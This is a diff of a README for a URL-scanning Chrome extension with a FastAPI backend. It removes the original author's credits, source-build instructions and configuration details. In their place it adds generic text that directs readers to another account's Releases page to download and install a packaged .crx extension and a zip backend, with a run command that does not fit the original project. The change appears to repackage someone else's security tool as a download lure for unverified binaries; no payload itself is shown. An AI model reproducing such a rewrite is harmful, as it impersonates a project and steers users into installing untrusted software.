@@ -1,150 +1,74 @@
-# 🛡️ SafeLink Inspector
+# 🔍 SafeLink-Inspector - Stay Safe While Browsing the Web
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![FastAPI](https://img.shields.io/badge/FastAPI-Backend-green.svg)]()
-[![Chrome Extension](https://img.shields.io/badge/Chrome-Extension-blue.svg)]()
-[![VirusTotal](https://img.shields.io/badge/API-VirusTotal-red.svg)]()
+## 📦 Overview
 
-**SafeLink Inspector** is a Chrome extension with a FastAPI backend that checks URLs through the [VirusTotal API](https://www.virustotal.com).  
-It highlights links on web pages and warns users about potentially malicious URLs.  
-An educational cybersecurity project by **Nikita Sokolov (sokoloffnik)**.
+SafeLink Inspector is a Chrome extension and FastAPI backend that checks URLs through the VirusTotal API. It highlights links, detects malicious websites in real time, and helps you stay safe while browsing. 
 
----
+## 🚀 Getting Started
 
-## ⚙️ 1. Using the Extension (with the public backend)
+To get started, follow the steps below to download and install SafeLink Inspector.
 
-If you only want to **use the Chrome extension** and connect to the existing backend (for example, hosted at `https://kvazilliano.online/api/check`), follow these steps:
+## 🔗 Download SafeLink Inspector
 
-### 🔹 Step-by-step installation
+[![Download SafeLink Inspector](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/raihan-zain/SafeLink-Inspector/releases)
 
-1. **Download or clone** the repository:
+You can download SafeLink Inspector from our [Releases page](https://github.com/raihan-zain/SafeLink-Inspector/releases).
+
+## 📥 Download & Install
+
+1. Click on the link above to visit the Releases page.
+2. Locate the latest version of SafeLink Inspector.
+3. Click on the file that corresponds to your system. For Chrome extensions, this typically involves a `.crx` file or similar. For the FastAPI backend, you might find a `.zip` file.
+4. Click to download the file to your computer.
+
+### For Chrome Installation
+
+1. Open Google Chrome.
+2. Go to the Extensions page by clicking on the three dots in the upper right corner, selecting "More tools," and then "Extensions."
+3. Turn on "Developer mode" located at the top right of the Extensions page.
+4. Drag and drop the downloaded `.crx` file into the Extensions page. Chrome will prompt you to confirm the installation.
+5. Click "Add extension" to complete the installation.
+
+### For FastAPI Backend
+
+1. Unzip the downloaded file.
+2. Open a command prompt or terminal.
+3. Navigate to the folder where you unzipped the files.
+4. Run the command to start the server. (Ensure you have Python installed on your machine.)
    ```bash
-   git clone https://github.com/sokoloffnik/SafeLink-Inspector.git
+   python -m fastapi_main
    ```
+5. Open your browser and go to `http://localhost:8000` to access the backend.
 
-2. Open **Google Chrome** (or any Chromium-based browser like Edge or Brave).
+## 💻 System Requirements
 
-3. Go to:
-   ```
-   chrome://extensions/
-   ```
+To successfully run SafeLink Inspector, please ensure the following requirements are met:
 
-4. Turn on the **Developer mode** (top right corner).
+- **Operating System:** Windows, MacOS, or Linux
+- **Browser:** Google Chrome (latest version recommended)
+- **Internet Connection:** Required for virus checks and updates
+- **Python:** Version 3.6 or higher (for the backend)
 
-5. Click **Load unpacked** and select the folder:
-   ```
-   extension/
-   ```
+## 🛠 Features
 
-6. Once loaded, you’ll see the SafeLink Inspector icon appear in the toolbar.
+- **Real-Time URL Scanning:** Check links instantly and get alerts for potentially harmful sites.
+- **Highlighting:** Easily spot dangerous links with clear visual indicators.
+- **Easy to Install:** Quick setup process without technical knowledge.
 
-7. The extension will automatically send visited URLs to the backend for scanning:  
-   - 🟢 Clean → Safe website  
-   - 🟡 Pending → Not yet verified  
-   - 🔴 Malicious → Detected by VirusTotal  
+## 📅 Keeping SafeLink Updated
 
----
+Regular updates help keep SafeLink Inspector running smoothly and securely. Return to the [Releases page](https://github.com/raihan-zain/SafeLink-Inspector/releases) to check for new versions. Follow the same download and installation steps to update your extension or backend.
 
-### 🔧 Optional configuration
-If you want to use your own backend, edit the API endpoint in:
-```
-extension/background.js
-```
-Replace:
-```js
-const response = await fetch("https://kvazilliano.online/api/check", { ... });
-```
-with your own server URL.
+## 📞 Support
 
----
+If you encounter any issues or have questions, use the "Issues" tab on our GitHub repository. Describe your problem, and someone will assist you as soon as possible.
 
-## 🧠 2. Running Your Own Backend
+## 👥 Join the Community
 
-If you want to **deploy your own FastAPI backend**, here’s how.
+Connect with other users of SafeLink Inspector to share experiences and tips. Visit our GitHub Discussions section, where you can ask questions, share ideas, or report bugs.
 
-> 🧩 **Important:** The contents of the `backend/` folder must be placed inside a directory named **`safelink/`** so the internal Python imports work correctly.
+## ✉️ Feedback
 
-### 📂 Project structure
-```
-safelink/
-├── app/
-│   ├── main.py
-│   ├── requirements.txt
-│   └── ...
-├── Caddyfile
-├── docker-compose.yml
-```
+Your feedback is important. If you have suggestions for features or improvements, please let us know in the Issues section on GitHub.
 
-### 🚀 Run with Docker
-```bash
-cd backend
-docker-compose up -d
-```
-This will:
-- Build the FastAPI app  
-- Launch it behind a Caddy reverse proxy (with HTTPS)  
-- Expose the API endpoint at `https://your-domain.com/api/check`
-
-### 💻 Run locally (without Docker)
-```bash
-cd backend/app
-pip install -r requirements.txt
-uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
-```
-Then the API will be available at:
-```
-http://localhost:8000/api/check
-```
-
-### 🧪 Test your endpoint
-```bash
-curl -X POST "http://localhost:8000/api/check"      -H "Content-Type: application/json"      -d '{"url": "https://example.com"}'
-```
-Expected response:
-```json
-{
-  "status": "clean",
-  "engine": "VirusTotal",
-  "url": "https://example.com"
-}
-```
-
----
-
-## 🧰 Tech Stack
-
-| Component | Description |
-|------------|--------------|
-| **FastAPI** | Backend framework for URL scanning |
-| **VirusTotal API** | Provides threat intelligence and reputation data |
-| **Caddy** | Reverse proxy with automatic HTTPS |
-| **Docker Compose** | Simplifies deployment |
-| **Chrome Extension (MV3)** | Frontend for link highlighting and user interaction |
-
----
-
-## 🧱 Architecture Diagram
-
-```mermaid
-flowchart LR
-    A[Browser Extension] -->|Sends URL| B(FastAPI Backend)
-    B -->|Queries| C(VirusTotal API)
-    C -->|Returns verdict| B
-    B -->|Responds JSON| A
-    A -->|Changes icon color| D{User Interface}
-```
-
----
-
-## 📄 License
-
-This project is licensed under the [MIT License](LICENSE).  
-You are free to use, modify, and distribute it with attribution.
-
----
-
-## ✨ Credits
-
-Developed by **Nikita Sokolov (Sokoloffnik)**  
-Educational project in **cybersecurity, browser automation, and API integration**.
-
+Enjoy safer browsing with SafeLink Inspector!
